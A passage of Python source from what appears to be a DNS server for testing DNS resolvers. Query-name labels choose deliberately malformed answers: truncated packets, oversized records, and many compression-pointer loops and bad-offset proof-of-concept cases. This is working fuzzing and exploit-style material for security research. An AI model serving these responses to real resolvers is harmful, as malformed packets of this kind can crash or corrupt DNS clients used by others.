              # Send A record, but cut X bytes from the buffer
              ip = "1.2.3.4"
              cutbytes = 0  # how many bytes to cut
              if req_domain_labels[1].isnumeric():
                 cutbytes = int(req_domain_labels[1])
              ### DNS header ########
              buffer = prep_dns_header(b'\x84\x00', req_QURR, 1, 0, 0)
              ### QUESTION SECTION ########
              if noq: buffer += convDom2Bin(req_domain) + req_type_bin + req_class_bin
              ### ANSWER SECTION ########
              # A
              buffer += convDom2Bin(req_domain) + getTypeBin("A") + getClassBin("IN")
              buffer += struct.pack(">L", customttl)                    ## TTL
              buffer += struct.pack(">H", 4)                            ## Data length
              buffer += socket.inet_aton(ip)                            ## IP
              buffer_len = len(buffer)
              if cutbytes > buffer_len:
                 cutbytes = buffer_len
              newbuf  = buffer[0:buffer_len-cutbytes]
              log("A %s (sending %d/%d B)" % (ip, len(newbuf), buffer_len))
              send_buf(self, newbuf, buffer_len)
              #####################################################################
           elif first_label.startswith("cutcnamebuf"):
              # Send CNAME record, but cut X bytes from the buffer
              cutbytes = 0  # how many bytes to cut
              if req_domain_labels[1].isnumeric():
                 cutbytes = int(req_domain_labels[1])
              ### DNS header ########
              buffer = prep_dns_header(b'\x84\x00', req_QURR, 1, 0, 0)
              ### QUESTION SECTION ########
              if noq: buffer += convDom2Bin(req_domain) + req_type_bin + req_class_bin
              ### ANSWER SECTION ########
              # CNAME
              dom = "always" + str(random.randint(100000,999999)) + "." + sld_tld_domain
              buffer += convDom2Bin(req_domain) + getTypeBin("CNAME") + getClassBin("IN")
              buffer += struct.pack(">L", customttl)               ## TTL
              buffer += struct.pack(">H", len(dom)+2)              ## Data length
              buffer += convDom2Bin(dom)                           ## CNAME value
              buffer_len = len(buffer)
              if cutbytes > buffer_len:
                 cutbytes = buffer_len
              newbuf  = buffer[0:buffer_len-cutbytes]
              log("CNAME %s (sending %d/%d B)" % (dom, len(newbuf), buffer_len))
              send_buf(self, newbuf, buffer_len)
              #####################################################################
           elif first_label.startswith("bigcname"):
              # Send big CNAME record, for example:
              # bigcname.10.5.10.dnslabtest1.com will generate CNAME of:
              #            10       5       10
              # always.7ogeechcv7.hlri6.5ljh1607ca.dnslabtest1.com
              ### DNS header ########
              buffer = prep_dns_header(b'\x84\x00', req_QURR, 1, 0, 0)
              ### QUESTION SECTION ########
              if noq: buffer += convDom2Bin(req_domain) + req_type_bin + req_class_bin
              ### ANSWER SECTION ########
              dom = "always"
              for lbl in req_domain_labels:
                  if lbl.isnumeric():
                     dom += '.' + ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(int(lbl)))
              dom += '.' + sld_tld_domain
              # CNAME
              buffer += convDom2Bin(req_domain) + getTypeBin("CNAME") + getClassBin("IN")
              buffer += struct.pack(">L", customttl)               ## TTL
              buffer += struct.pack(">H", len(dom)+2)              ## Data length
              buffer += convDom2Bin(dom)                           ## CNAME value
              # log and send
              log("CNAME %s (%d B)" % (dom, len(dom)))
              send_buf(self, buffer)
              #####################################################################
           elif first_label.startswith("manylabels"):
              # Send big CNAME record made of many labels, for example:
              labels = 10  # number of domain labels
              if req_domain_labels[1].isnumeric():
                 labels = int(req_domain_labels[1])
              labelsize = 1  # label size
              if req_domain_labels[2].isnumeric():
                 labelsize = int(req_domain_labels[2])
              ### DNS header ########
              buffer = prep_dns_header(b'\x84\x00', req_QURR, 1, 0, 0)
              ### QUESTION SECTION ########
              if noq: buffer += convDom2Bin(req_domain) + req_type_bin + req_class_bin
              ### ANSWER SECTION ########
              dom = "always."
              for i in range(labels):
                  lbl = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(labelsize))
                  dom += lbl + "."
              dom += sld_tld_domain
              # # # # # 
              buffer += convDom2Bin(req_domain) + getTypeBin("CNAME") + getClassBin("IN")
              buffer += struct.pack(">L", customttl)          ## TTL
              buffer += struct.pack(">H", len(dom)+2)         ## Data length
              buffer += convDom2Bin(dom)
              # log and send
              log("A %s" % (dom))
              send_buf(self, buffer)
              #####################################################################
           elif first_label.startswith("manycnames"):
              # Send X number of CNAME records
              nans = 10  # number of answers (10 default)
              if req_domain_labels[1].isnumeric():
                 nans = int(req_domain_labels[1])
              ### DNS header ########
              buffer = prep_dns_header(b'\x84\x00', req_QURR, nans, 0, 0)
              ### QUESTION SECTION ########
              if noq: buffer += convDom2Bin(req_domain) + req_type_bin + req_class_bin
              ### ANSWER SECTION ########
              # generate alwaysXXXX domains
              for i in range(nans):
                  dom = "always" + str(random.randint(1,100000)) + "." + sld_tld_domain
                  buffer += convDom2Bin(req_domain) + getTypeBin("CNAME") + getClassBin("IN")
                  buffer += struct.pack(">L", customttl)               ## TTL
                  buffer += struct.pack(">H", len(dom)+2)              ## Data length
                  buffer += convDom2Bin(dom)                           ## CNAME value
              # log and send
              log("sending %d always* CNAMEs" % (nans))
              send_buf(self, buffer)
              #####################################################################
           elif first_label.startswith("bigtxt"):
              # Send big TXT record
              size = 10  # number of chunks
              if req_domain_labels[1].isnumeric():
                 size = int(req_domain_labels[1])
              chunksize = 255  # chunk size
              if req_domain_labels[2].isnumeric():
                 chunksize = int(req_domain_labels[2])
              ### DNS header ########
              buffer = prep_dns_header(b'\x84\x00', req_QURR, 1, 0, 0)
              ### QUESTION SECTION ########
              if noq: buffer += convDom2Bin(req_domain) + req_type_bin + req_class_bin
              ### ANSWER SECTION ########
              data = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(int(chunksize)))
              for i in range(size-1):
                  data += '.' + ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(int(chunksize)))
              # TXT
              buffer += convDom2Bin(req_domain) + getTypeBin("TXT") + getClassBin("IN")
              buffer += struct.pack(">L", customttl)           ## TTL
              buffer += struct.pack(">H", len(data)+1)         ## Data length
              buffer += convData2Bin(data)
              # log and send
              log("TXT with %d labels of %d B each (total: %d B)" % (size, chunksize, len(buffer)))
              send_buf(self, buffer)
              #####################################################################
           elif first_label.startswith("bigbintxt"):
              # Send big binary TXT record
              size = 10  # number of chunks
              if req_domain_labels[1].isnumeric():
                 size = int(req_domain_labels[1])
              chunksize = 255  # chunk size
              if req_domain_labels[2].isnumeric():
                 chunksize = int(req_domain_labels[2])
              ### DNS header ########
              buffer = prep_dns_header(b'\x84\x00', req_QURR, 1, 0, 0)
              ### QUESTION SECTION ########
              if noq: buffer += convDom2Bin(req_domain) + req_type_bin + req_class_bin
              ### ANSWER SECTION ########
              data = struct.pack(">B", chunksize) + os.urandom(chunksize)
              for i in range(size-1):
                  data += struct.pack(">B", chunksize) + os.urandom(chunksize)
              # TXT
              buffer += convDom2Bin(req_domain) + getTypeBin("TXT") + getClassBin("IN")
              buffer += struct.pack(">L", customttl)           ## TTL
              buffer += struct.pack(">H", len(data))           ## Data length
              buffer += data
              # log and send
              log("TXT with %d binary labels of %d B each (total: %d B)" % (size, chunksize, len(buffer)))
              send_buf(self, buffer)
              #####################################################################
           elif first_label.startswith("manytxt"):
              # Send many random TXT records
              nans = 10  # number of TXT records to send
              if req_domain_labels[1].isnumeric():
                 nans = int(req_domain_labels[1])
              chunksize = 255  # chunk size
              if req_domain_labels[2].isnumeric():
                 chunksize = int(req_domain_labels[2])
              ### DNS header ########
              buffer = prep_dns_header(b'\x84\x00', req_QURR, nans, 0, 0)
              ### QUESTION SECTION ########
              if noq: buffer += convDom2Bin(req_domain) + req_type_bin + req_class_bin
              ### ANSWER SECTION ########
              for i in range(nans):
                  data    = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(chunksize))
                  buffer += convDom2Bin(req_domain) + getTypeBin("TXT") + getClassBin("IN")
                  buffer += struct.pack(">L", customttl)           ## TTL
                  buffer += struct.pack(">H", len(data)+1)         ## Data length
                  buffer += convData2Bin(data)
              # log and send
              log("%d TXT records of %d B (total: %d B)" % (nans, chunksize, len(buffer)))
              send_buf(self, buffer)
              #####################################################################
           elif first_label.startswith("manybintxt"):
              # Send many random binary TXT records
              nans = 10  # number of TXT records to send
              if req_domain_labels[1].isnumeric():
                 nans = int(req_domain_labels[1])
              chunksize = 255  # chunk size
              if req_domain_labels[2].isnumeric():
                 chunksize = int(req_domain_labels[2])
              ### DNS header ########
              buffer = prep_dns_header(b'\x84\x00', req_QURR, nans, 0, 0)
              ### QUESTION SECTION ########
              if noq: buffer += convDom2Bin(req_domain) + req_type_bin + req_class_bin
              ### ANSWER SECTION ########
              for i in range(nans):
                  data    = os.urandom(chunksize)
                  buffer += convDom2Bin(req_domain) + getTypeBin("TXT") + getClassBin("IN")
                  buffer += struct.pack(">L", customttl)           ## TTL
                  buffer += struct.pack(">H", len(data)+1)         ## Data length
                  buffer += struct.pack(">B", len(data))           ## TXT length
                  buffer += data
              # log and send
              log("%d binary TXT records of %d B (total: %d B)" % (nans, chunksize, len(buffer)))
              send_buf(self, buffer)
              #####################################################################
           elif first_label.startswith("customtype"):
              # Send answer with a custom requested type
              thetype = getTypeCode("TXT")
              if req_domain_labels[1].isnumeric():
                 thetype = int(req_domain_labels[1])
              ### DNS header ########
              buffer = prep_dns_header(b'\x84\x00', req_QURR, 1, 0, 0)
              ### QUESTION SECTION ########
              if noq: buffer += convDom2Bin(req_domain) + req_type_bin + req_class_bin
              ### ANSWER SECTION ########
              databin = getRandomDataOfType(thetype)
              buffer += convDom2Bin(req_domain) + struct.pack(">H", thetype) + getClassBin("IN")
              buffer += struct.pack(">L", customttl)           ## TTL
              buffer += struct.pack(">H", len(databin))        ## Data length
              buffer += databin
              # log and send
              log("type %d (%s)" % (thetype, getTypeName(thetype)))
              send_buf(self, buffer)
              #####################################################################
           elif first_label.startswith("badcompress1"):
              # Send answer with arbitrary compression pointer in the ANSWER section in the query name
              offset = 12  # default offset is 12, which points to the domain name in the question
              if req_domain_labels[1].isnumeric():
                 offset = int(req_domain_labels[1])
              ### DNS header ########
              buffer = prep_dns_header(b'\x84\x00', req_QURR, 1, 0, 0)
              ### QUESTION SECTION ########
              if noq: buffer += convDom2Bin(req_domain) + req_type_bin + req_class_bin
              ### ANSWER SECTION ########
              # CNAME
              badcomp = b"\xc0" + struct.pack(">B", offset)        ## arbitrary offset in the answer in the Name
              buffer += badcomp + getTypeBin("CNAME") + getClassBin("IN")
              buffer += struct.pack(">L", customttl)               ## TTL
              dom = "always" + str(random.randint(1,100000)) + "." + sld_tld_domain
              buffer += struct.pack(">H", len(dom)+2)              ## Data length
              buffer += convDom2Bin(dom)                           ## CNAME value
              # log and send
              log("CNAME %s (badcomp 1, answer Name, offset %d)" % (dom, offset))
              send_buf(self, buffer)
              #####################################################################
           elif first_label.startswith("badcompress2"):
              # Send answer with arbitrary compression pointer in the ANSWER section in the CNAME name
              offset = 12  # default offset is 12, which points to the domain name in the question
              if req_domain_labels[1].isnumeric():
                 offset = int(req_domain_labels[1])
              ### DNS header ########
              buffer = prep_dns_header(b'\x84\x00', req_QURR, 1, 0, 0)
              ### QUESTION SECTION ########
              if noq: buffer += convDom2Bin(req_domain) + req_type_bin + req_class_bin
              ### ANSWER SECTION ########
              # CNAME
              buffer += b"\xc0\x0c" + getTypeBin("CNAME") + getClassBin("IN")  ## using compression here, no problem
              buffer += struct.pack(">L", customttl)                     ## TTL
              dom = b"\x03abc" + b"\xc0" + struct.pack(">B", offset)  ## arbitrary offset in the answer in the CNAME
              buffer += struct.pack(">H", len(dom))                      ## Data length
              buffer += dom                                              ## CNAME value
              # log and send
              log("CNAME abc.%s (badcomp 2, CNAME, offset %d)" % (req_domain, offset))
              send_buf(self, buffer)
              #####################################################################
           elif first_label.startswith("badcompressfwptr1"):
              # Send answer with a forward compression pointer pointing to another pointer - variant 1
              ### DNS header ########
              buffer = prep_dns_header(b'\x84\x00', req_QURR, 1, 0, 0)
              ### QUESTION SECTION ########
              if noq: buffer += convDom2Bin(req_domain) + req_type_bin + req_class_bin
              ### ANSWER SECTION ########
              # CNAME
              offset_to_last_cname = len(req_domain) + 12 + 18  ## forward pointer to the CNAME in the end
              buffer += b"\xc0" + struct.pack(">B", offset_to_last_cname) + getTypeBin("CNAME") + getClassBin("IN")
              buffer += struct.pack(">L", customttl)            ## TTL
              dom = b"\x03abc" + b"\xc0\x0c"                    ## "abc" + pointer to the first domain name (in the query)
              buffer += struct.pack(">H", len(dom))             ## Data length
              buffer += dom                                     ## CNAME value
              # log and send
              log("CNAME abc.%s (badcomp with forward pointer 1)" % (req_domain))
              send_buf(self, buffer)
              #####################################################################
           elif first_label.startswith("badcompressfwptr2"):
              # Send answer with a forward compression pointer pointing to another pointer - variant 2
              ### DNS header ########
              buffer = prep_dns_header(b'\x84\x00', req_QURR, 1, 0, 0)
              ### QUESTION SECTION ########
              if noq: buffer += convDom2Bin(req_domain) + req_type_bin + req_class_bin
              ### ANSWER SECTION ########
              # CNAME
              offset_to_last_cname = len(req_domain) + 12 + 18 + 4 ## forward pointer to the CNAME in the end, but also
                                                                   ## skipping the "abc" portion, so it's like a small chain
              buffer += b"\xc0" + struct.pack(">B", offset_to_last_cname) + getTypeBin("CNAME") + getClassBin("IN")
              buffer += struct.pack(">L", customttl)            ## TTL
              dom = b"\x03abc" + b"\xc0\x0c"                    ## "abc" + pointer to the first domain name (in the query)
              buffer += struct.pack(">H", len(dom))             ## Data length
              buffer += dom                                     ## CNAME value
              # log and send
              log("CNAME abc.%s (badcomp with forward pointer 2)" % (req_domain))
              send_buf(self, buffer)
              #####################################################################
           elif first_label.startswith("badcompressloop1"):
              # Send answer with a compression pointer loop in the Answer name - variant 1
              ### DNS header ########
              buffer = prep_dns_header(b'\x84\x00', req_QURR, 1, 0, 0)
              ### QUESTION SECTION ########
              if noq: buffer += convDom2Bin(req_domain) + req_type_bin + req_class_bin
              ### ANSWER SECTION ########
              # CNAME
              offset_to_middle_name = len(req_domain) + 18   ## forward pointer to the name in the middle
              baddom = b"\xc0" + struct.pack(">B", offset_to_middle_name)
              buffer += baddom + getTypeBin("CNAME") + getClassBin("IN")
              buffer += struct.pack(">L", customttl)               ## TTL
              dom = "always" + str(random.randint(1,100000)) + "." + sld_tld_domain
              buffer += struct.pack(">H", len(dom)+2)              ## Data length
              buffer += convDom2Bin(dom)                           ## CNAME value
              # log and send
              log("CNAME %s (badcomp loop 1, answer Name, <LOOP>)" % (dom))
              send_buf(self, buffer)
              #####################################################################
           elif first_label.startswith("badcompressloop2"):
              # Send answer with a compression pointer loop in the Answer name - variant 2
              ### DNS header ########
              buffer = prep_dns_header(b'\x84\x00', req_QURR, 1, 0, 0)
              ### QUESTION SECTION ########
              if noq: buffer += convDom2Bin(req_domain) + req_type_bin + req_class_bin
              ### ANSWER SECTION ########
              # CNAME
              offset_to_middle_name = len(req_domain) + 18   ## forward pointer to the name in the middle
              baddom = b"\x03abc" + b"\xc0" + struct.pack(">B", offset_to_middle_name)
              buffer += baddom + getTypeBin("CNAME") + getClassBin("IN")
              buffer += struct.pack(">L", customttl)               ## TTL
              dom = "always" + str(random.randint(1,100000)) + "." + sld_tld_domain
              buffer += struct.pack(">H", len(dom)+2)              ## Data length
              buffer += convDom2Bin(dom)                           ## CNAME value
              # log and send
              log("CNAME %s (badcomp loop 2, answer Name, abc<LOOP>)" % (dom))
              send_buf(self, buffer)
              #####################################################################
           elif first_label.startswith("badcompressloop3"):
              # Send answer with a compression pointer loop involving a forward pointer and a backward pointer
              ### DNS header ########
              buffer = prep_dns_header(b'\x84\x00', req_QURR, 1, 0, 0)
              ### QUESTION SECTION ########
              if noq: buffer += convDom2Bin(req_domain) + req_type_bin + req_class_bin
              ### ANSWER SECTION ########
              # CNAME
              offset_to_last_cname = len(req_domain) + 12 + 18     ## forward pointer to the CNAME in the end
              buffer += b"\xc0" + struct.pack(">B", offset_to_last_cname) + getTypeBin("CNAME") + getClassBin("IN")
              buffer += struct.pack(">L", customttl)               ## TTL
              offset_to_middle_name = len(req_domain) + 18         ## backward pointer to the name in the middle
              dom = b"\x03abc" + b"\xc0" + struct.pack(">B", offset_to_middle_name)
              buffer += struct.pack(">H", len(dom))                ## Data length
              buffer += dom                                        ## CNAME value
              # log and send
              log("CNAME abc.<LOOP> (badcomp loop 3 in the answer Name and CNAME)")
              send_buf(self, buffer)
              #####################################################################
           elif first_label.startswith("badcompressloop4"):
              # Send answer with a compression pointer loop in the CNAME - variant 1
              ### DNS header ########
              buffer = prep_dns_header(b'\x84\x00', req_QURR, 1, 0, 0)
              ### QUESTION SECTION ########
              if noq: buffer += convDom2Bin(req_domain) + req_type_bin + req_class_bin
              ### ANSWER SECTION ########
              # CNAME
              buffer += b"\xc0\x0c" + getTypeBin("CNAME") + getClassBin("IN")
              buffer += struct.pack(">L", customttl)               ## TTL
              offset_to_last_cname = len(req_domain) + 12 + 18     ## forward pointer to the CNAME in the end
              dom = b"\xc0" + struct.pack(">B", offset_to_last_cname)
              buffer += struct.pack(">H", len(dom))                ## Data length
              buffer += dom                                        ## CNAME value with pointer to itself
              # log and send
              log("CNAME <LOOP> (badcomp loop 4 in CNAME)")
              send_buf(self, buffer)
              #####################################################################
           elif first_label.startswith("badcompressloop5"):
              # Send answer with a compression pointer loop in the CNAME - variant 2
              ### DNS header ########
              buffer = prep_dns_header(b'\x84\x00', req_QURR, 1, 0, 0)
              ### QUESTION SECTION ########
              if noq: buffer += convDom2Bin(req_domain) + req_type_bin + req_class_bin
              ### ANSWER SECTION ########
              # CNAME
              buffer += b"\xc0\x0c" + getTypeBin("CNAME") + getClassBin("IN")
              buffer += struct.pack(">L", customttl)               ## TTL
              offset_to_last_cname = len(req_domain) + 12 + 18     ## forward pointer to the CNAME in the end
              dom = b"\x03abc" + b"\xc0" + struct.pack(">B", offset_to_last_cname)
              buffer += struct.pack(">H", len(dom))                ## Data length
              buffer += dom                                        ## CNAME value with pointer to itself
              # log and send
              log("CNAME abc<LOOP> (badcomp loop 5 in CNAME)")
              send_buf(self, buffer)
              #####################################################################
           elif first_label.startswith("badcompressmid1"):
              # Send answer with a compression pointer in the CNAME in the middle, trying to
              # concatenate it with additional string
              ### DNS header ########
              buffer = prep_dns_header(b'\x84\x00', req_QURR, 1, 0, 0)
              ### QUESTION SECTION ########
              if noq: buffer += convDom2Bin(req_domain) + req_type_bin + req_class_bin
              ### ANSWER SECTION ########
              # CNAME
              buffer += b"\xc0\x0c" + getTypeBin("CNAME") + getClassBin("IN")
              buffer += struct.pack(">L", customttl)               ## TTL
              dom = b"\x03abc" + b"\xc0\x0c" + convDom2Bin("hello")
              buffer += struct.pack(">H", len(dom))                ## Data length
              buffer += dom                                        ## CNAME value with pointer to itself
              # log and send
              log("CNAME abc.%s.hello (bad comp mid1, appended hello)" % (req_domain))
              send_buf(self, buffer)
              #####################################################################
           elif first_label.startswith("badcompresspoc1wn"):
              # Send TXT record ending with NULL + CNAME with compression
              # pointing to the previous TXT record
              ### DNS header ########
              buffer = prep_dns_header(b'\x84\x00', req_QURR, 2, 0, 0)
              ### QUESTION SECTION ########
              if noq: buffer += convDom2Bin(req_domain) + req_type_bin + req_class_bin
              ### ANSWER SECTION ########
              databin = b"\x0babcdeabcde\x00"
              # TXT        ~~~ CNAME points here
              buffer += convDom2Bin(req_domain) + getTypeBin("TXT") + getClassBin("IN")
              buffer += struct.pack(">L", customttl)           ## TTL
              buffer += struct.pack(">H", len(databin))        ## Data length
              buffer += databin
              # CNAME
              offset_to_the_txt = (len(req_domain)*2) + 18 + 12 ## backward pointer to the previous TXT record
              databin = b"\xc0" + struct.pack(">B", offset_to_the_txt)
              buffer += convDom2Bin(req_domain) + getTypeBin("CNAME") + getClassBin("IN")
              buffer += struct.pack(">L", customttl)           ## TTL
              buffer += struct.pack(">H", len(databin))        ## Data length
              buffer += databin
              # log and send
              log("TXT + CNAME (poc1 with NULL)")
              send_buf(self, buffer)
              #####################################################################
           elif first_label.startswith("badcompresspoc1nn"):
              # Send TXT record without NULL + CNAME with compression
              # pointing to the previous TXT record
              ### DNS header ########
              buffer = prep_dns_header(b'\x84\x00', req_QURR, 2, 0, 0)
              ### QUESTION SECTION ########
              if noq: buffer += convDom2Bin(req_domain) + req_type_bin + req_class_bin
              ### ANSWER SECTION ########
              databin = b"\x0babcdeabcdef"
              # TXT        ~~~ CNAME points here
              buffer += convDom2Bin(req_domain) + getTypeBin("TXT") + getClassBin("IN")
              buffer += struct.pack(">L", customttl)           ## TTL
              buffer += struct.pack(">H", len(databin))        ## Data length
              buffer += databin
              # CNAME
              offset_to_the_txt = (len(req_domain)*2) + 18 + 12 ## backward pointer to the previous TXT record
              databin = b"\xc0" + struct.pack(">B", offset_to_the_txt)
              buffer += convDom2Bin(req_domain) + getTypeBin("CNAME") + getClassBin("IN")
              buffer += struct.pack(">L", customttl)           ## TTL
              buffer += struct.pack(">H", len(databin))        ## Data length
              buffer += databin
              # log and send
              log("TXT + CNAME (poc1 no NULL)")
              send_buf(self, buffer)
              #####################################################################
           elif first_label.startswith("badcompresspoc2wn"):
              # Send TXT record with properly formated "abcd.com" domain name ending with NULL
              # + CNAME with compression pointing to the previous TXT record
              ### DNS header ########
              buffer = prep_dns_header(b'\x84\x00', req_QURR, 2, 0, 0)
              ### QUESTION SECTION ########
              if noq: buffer += convDom2Bin(req_domain) + req_type_bin + req_class_bin
              ### ANSWER SECTION ########
              databin = b"\x0a\x04abcd\x03com\x00"
              # TXT            ~~~ CNAME points here
              buffer += convDom2Bin(req_domain) + getTypeBin("TXT") + getClassBin("IN")
              buffer += struct.pack(">L", customttl)           ## TTL
              buffer += struct.pack(">H", len(databin))        ## Data length
              buffer += databin
              # CNAME
              offset_to_the_txt = (len(req_domain)*2) + 18 + 13 ## backward pointer to the previous TXT record
              databin = b"\xc0" + struct.pack(">B", offset_to_the_txt)
              buffer += convDom2Bin(req_domain) + getTypeBin("CNAME") + getClassBin("IN")
              buffer += struct.pack(">L", customttl)           ## TTL
              buffer += struct.pack(">H", len(databin))        ## Data length
              buffer += databin
              # log and send
              log("TXT + CNAME (poc2 with NULL)")
              send_buf(self, buffer)
              #####################################################################
           elif first_label.startswith("badcompresspoc2nn"):
              # Send TXT record with properly formated "abcd.com" domain name but without NULL
              # + CNAME with compression pointing to the previous TXT record
              ### DNS header ########
              buffer = prep_dns_header(b'\x84\x00', req_QURR, 2, 0, 0)
              ### QUESTION SECTION ########
              if noq: buffer += convDom2Bin(req_domain) + req_type_bin + req_class_bin
              ### ANSWER SECTION ########
              databin = b"\x09\x04abcd\x03com"
              # TXT            ~~~ CNAME points here
              buffer += convDom2Bin(req_domain) + getTypeBin("TXT") + getClassBin("IN")
              buffer += struct.pack(">L", customttl)           ## TTL
              buffer += struct.pack(">H", len(databin))        ## Data length
              buffer += databin
              # CNAME
              offset_to_the_txt = (len(req_domain)*2) + 18 + 13 ## backward pointer to the previous TXT record
              databin = b"\xc0" + struct.pack(">B", offset_to_the_txt)
              buffer += convDom2Bin(req_domain) + getTypeBin("CNAME") + getClassBin("IN")
              buffer += struct.pack(">L", customttl)           ## TTL
              buffer += struct.pack(">H", len(databin))        ## Data length
              buffer += databin
              # log and send
              log("TXT + CNAME (poc2 no NULL)")
              send_buf(self, buffer)
              #####################################################################
           elif first_label.startswith("badcompresspoc3wn"):
              # Send TXT record with badly formated "abcd.com" (note the ASCII dot) ending with NULL
              # + CNAME with compression pointing to the previous TXT record
              ### DNS header ########
              buffer = prep_dns_header(b'\x84\x00', req_QURR, 2, 0, 0)
              ### QUESTION SECTION ########
              if noq: buffer += convDom2Bin(req_domain) + req_type_bin + req_class_bin
              ### ANSWER SECTION ########
              databin = b"\x0a\x08abcd.com\x00"
              # TXT            ~~~ CNAME points here
              buffer += convDom2Bin(req_domain) + getTypeBin("TXT") + getClassBin("IN")
              buffer += struct.pack(">L", customttl)           ## TTL
              buffer += struct.pack(">H", len(databin))        ## Data length
              buffer += databin
              # CNAME
              offset_to_the_txt = (len(req_domain)*2) + 18 + 13 ## backward pointer to the previous TXT record
              databin = b"\xc0" + struct.pack(">B", offset_to_the_txt)
              buffer += convDom2Bin(req_domain) + getTypeBin("CNAME") + getClassBin("IN")
              buffer += struct.pack(">L", customttl)           ## TTL
              buffer += struct.pack(">H", len(databin))        ## Data length
              buffer += databin
              # log and send
              log("TXT + CNAME (poc3 with NULL)")
              send_buf(self, buffer)
              #####################################################################
           elif first_label.startswith("badcompresspoc3nn"):
              # Send TXT record with badly formated "abcd.com" (note the ASCII dot) without NULL
              # + CNAME with compression pointing to the previous TXT record
              ### DNS header ########
              buffer = prep_dns_header(b'\x84\x00', req_QURR, 2, 0, 0)
              ### QUESTION SECTION ########
              if noq: buffer += convDom2Bin(req_domain) + req_type_bin + req_class_bin
              ### ANSWER SECTION ########
              databin = b"\x09\x08abcd.com"
              # TXT            ~~~ CNAME points here
              buffer += convDom2Bin(req_domain) + getTypeBin("TXT") + getClassBin("IN")
              buffer += struct.pack(">L", customttl)           ## TTL
              buffer += struct.pack(">H", len(databin))        ## Data length
              buffer += databin
              # CNAME
              offset_to_the_txt = (len(req_domain)*2) + 18 + 13 ## backward pointer to the previous TXT record
              databin = b"\xc0" + struct.pack(">B", offset_to_the_txt)
              buffer += convDom2Bin(req_domain) + getTypeBin("CNAME") + getClassBin("IN")
              buffer += struct.pack(">L", customttl)           ## TTL
              buffer += struct.pack(">H", len(databin))        ## Data length
              buffer += databin
              # log and send
              log("TXT + CNAME (poc3 no NULL)")
              send_buf(self, buffer)
              #####################################################################
           elif first_label.startswith("badcompresspoc4wn"):
              # Send TXT record ending with NULL with multiple dots
              # + CNAME with compression pointing to the previous TXT record
              ### DNS header ########
              buffer = prep_dns_header(b'\x84\x00', req_QURR, 2, 0, 0)
              ### QUESTION SECTION ########
              if noq: buffer += convDom2Bin(req_domain) + req_type_bin + req_class_bin
              ### ANSWER SECTION ########
              databin = b"\x0a\x08a....com\x00"
              # TXT            ~~~ CNAME points here
              buffer += convDom2Bin(req_domain) + getTypeBin("TXT") + getClassBin("IN")
              buffer += struct.pack(">L", customttl)           ## TTL
              buffer += struct.pack(">H", len(databin))        ## Data length
              buffer += databin
              # CNAME
              offset_to_the_txt = (len(req_domain)*2) + 18 + 13 ## backward pointer to the previous TXT record
              databin = b"\xc0" + struct.pack(">B", offset_to_the_txt)
              buffer += convDom2Bin(req_domain) + getTypeBin("CNAME") + getClassBin("IN")
              buffer += struct.pack(">L", customttl)           ## TTL
              buffer += struct.pack(">H", len(databin))        ## Data length
              buffer += databin
              # log and send
              log("TXT + CNAME (poc4 with NULL)")
              send_buf(self, buffer)
              #####################################################################
           elif first_label.startswith("badcompresspoc4nn"):
              # Send TXT record (without NULL) with multiple dots
              # + CNAME with compression pointing to the previous TXT record
              ### DNS header ########
              buffer = prep_dns_header(b'\x84\x00', req_QURR, 2, 0, 0)
              ### QUESTION SECTION ########
              if noq: buffer += convDom2Bin(req_domain) + req_type_bin + req_class_bin
              ### ANSWER SECTION ########
              databin = b"\x09\x08a....com"
              # TXT            ~~~ CNAME points here
              buffer += convDom2Bin(req_domain) + getTypeBin("TXT") + getClassBin("IN")
              buffer += struct.pack(">L", customttl)           ## TTL
              buffer += struct.pack(">H", len(databin))        ## Data length
              buffer += databin
              # CNAME
              offset_to_the_txt = (len(req_domain)*2) + 18 + 13 ## backward pointer to the previous TXT record
              databin = b"\xc0" + struct.pack(">B", offset_to_the_txt)
              buffer += convDom2Bin(req_domain) + getTypeBin("CNAME") + getClassBin("IN")
              buffer += struct.pack(">L", customttl)           ## TTL
              buffer += struct.pack(">H", len(databin))        ## Data length
              buffer += databin
              # log and send
              log("TXT + CNAME (poc4 no NULL)")
              send_buf(self, buffer)
              #####################################################################
           elif first_label.startswith("badcompresspoc5wn"):
              # Send TXT record with some binary data and NULL
              # + CNAME with compression pointing to the previous TXT record
              ### DNS header ########
              buffer = prep_dns_header(b'\x84\x00', req_QURR, 2, 0, 0)
              ### QUESTION SECTION ########
              if noq: buffer += convDom2Bin(req_domain) + req_type_bin + req_class_bin
              ### ANSWER SECTION ########
              databin = b"\x0a\x08\x55\x66\x77\x88\x99\xaa\xbb\xcc\x00"
              # TXT            ~~~ CNAME points here
              buffer += convDom2Bin(req_domain) + getTypeBin("TXT") + getClassBin("IN")
              buffer += struct.pack(">L", customttl)           ## TTL
              buffer += struct.pack(">H", len(databin))        ## Data length
              buffer += databin
              # CNAME
              offset_to_the_txt = (len(req_domain)*2) + 18 + 13 ## backward pointer to the previous TXT record
              databin = b"\xc0" + struct.pack(">B", offset_to_the_txt)
              buffer += convDom2Bin(req_domain) + getTypeBin("CNAME") + getClassBin("IN")
              buffer += struct.pack(">L", customttl)           ## TTL
              buffer += struct.pack(">H", len(databin))        ## Data length
              buffer += databin
              # log and send
              log("TXT + CNAME (poc5 with NULL)")
              send_buf(self, buffer)
              #####################################################################
           elif first_label.startswith("badcompresspoc5nn"):
              # Send TXT record with some binary data without NULL
              # + CNAME with compression pointing to the previous TXT record
              ### DNS header ########
              buffer = prep_dns_header(b'\x84\x00', req_QURR, 2, 0, 0)
              ### QUESTION SECTION ########
              if noq: buffer += convDom2Bin(req_domain) + req_type_bin + req_class_bin
              ### ANSWER SECTION ########
              databin = b"\x09\x08\x55\x66\x77\x88\x99\xaa\xbb\xcc"
              # TXT            ~~~ CNAME points here
              buffer += convDom2Bin(req_domain) + getTypeBin("TXT") + getClassBin("IN")
              buffer += struct.pack(">L", customttl)           ## TTL
              buffer += struct.pack(">H", len(databin))        ## Data length
              buffer += databin
              # CNAME
              offset_to_the_txt = (len(req_domain)*2) + 18 + 13 ## backward pointer to the previous TXT record
              databin = b"\xc0" + struct.pack(">B", offset_to_the_txt)
              buffer += convDom2Bin(req_domain) + getTypeBin("CNAME") + getClassBin("IN")
              buffer += struct.pack(">L", customttl)           ## TTL
              buffer += struct.pack(">H", len(databin))        ## Data length
              buffer += databin
              # log and send
              log("TXT + CNAME (poc5 no NULL)")
              send_buf(self, buffer)
